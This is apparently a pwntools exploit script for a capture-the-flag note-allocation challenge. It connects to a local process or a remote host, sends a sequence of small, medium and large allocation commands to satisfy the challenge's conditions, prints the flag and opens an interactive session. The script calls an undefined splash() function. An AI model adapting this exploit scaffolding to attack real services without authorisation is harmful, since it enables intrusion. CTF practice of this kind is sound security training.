from pwn import *
import sys

argv = sys.argv

DEBUG = False
BINARY = argv[1]
elf = ELF(BINARY)


context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
	gdb.attach(sh)


if DEBUG:
	context.log_level = 'debug'

def connect():
    if len(argv) < 3:
    	stdout = process.PTY
    	stdin = process.PTY

    	sh = process(BINARY, stdout=stdout, stdin=stdin)

    	if DEBUG:
    		attach_gdb()

    	REMOTE = False
    else:
    	NC = sys.argv[2]
    	ip = NC.split(":")[0]
    	port = int(NC.split(":")[1])
    	sh = remote(ip, port)
    	REMOTE = True
    return sh

def alloc_small(size, sh):
    sh.sendlineafter("command:\n", "small")
    sh.sendlineafter("note:\n", size)
def alloc_med(size, sh):
    sh.sendlineafter("command:\n", "medium")
    sh.sendlineafter("note:\n", size)
def alloc_large(size, sh):
    sh.sendlineafter("command:\n", "large")
    sh.sendlineafter("note:\n", size)
def print_flag(sh):
    sh.sendlineafter("command:\n", "flag")
    return sh.recvline()

# Cool!
splash()

# Connect to local/remote process
sh = connect()

# Allocate 3 chunks in each function, free small after each
alloc_small("1", sh)
alloc_small("0", sh)

alloc_med("1", sh)
alloc_small("0", sh)

alloc_large("1", sh)
alloc_small("0", sh)

# All of the constraints are now satisfied, print flag
print(print_flag(sh))

# Open shell
sh.interactive()